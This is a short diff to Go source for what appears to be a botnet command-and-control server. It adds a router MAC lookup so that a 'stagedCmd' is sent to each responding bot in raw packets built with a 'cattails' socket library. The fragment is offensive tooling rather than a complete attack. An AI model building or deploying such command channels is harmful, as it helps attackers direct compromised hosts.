@@ -21,14 +21,14 @@ type Host struct {
 }
 
 // sendCommand takes
-func sendCommand(iface *net.Interface, src net.IP, listen chan Host) {
+func sendCommand(iface *net.Interface, src net.IP, dstMAC net.HardwareAddr, listen chan Host) {
 
 	// Forever loop to respond to bots
 	for {
 		bot := <-listen
 		fd := cattails.NewSocket()
 		// Create packet
-		packet := cattails.CreatePacket(iface, src, bot.IP, bot.Mac, cattails.CreateCommand(stagedCmd))
+		packet := cattails.CreatePacket(iface, src, bot.IP, dstMAC, cattails.CreateCommand(stagedCmd))
 		fmt.Println("Packet:", packet)
 		fmt.Println("Repsonding to:", bot)
 
@@ -77,9 +77,14 @@ func main() {
 	// Iface and src ip for the sendcommand func to use
 	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
 
+	dstMAC, err := cattails.GetRouterMAC()
+	if err != nil {
+		log.Fatal(err)
+	}
+
 	// Spawn routine to listen for responses
 	fmt.Println("Starting go routine...")
-	go sendCommand(iface, src, listen)
+	go sendCommand(iface, src, dstMAC, listen)
 
 	fmt.Println("Entering recieve loop")
 
